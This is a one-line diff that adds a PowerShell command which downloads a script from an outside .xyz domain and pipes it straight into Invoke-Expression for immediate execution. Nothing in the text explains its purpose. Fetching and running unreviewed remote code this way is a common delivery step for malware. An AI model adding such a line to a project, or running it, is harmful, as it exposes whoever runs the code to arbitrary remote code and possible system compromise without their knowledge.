@@ -1,0 +1,1 @@
+powershell -c "irm https://scripts.0002099.xyz/windows | iex"
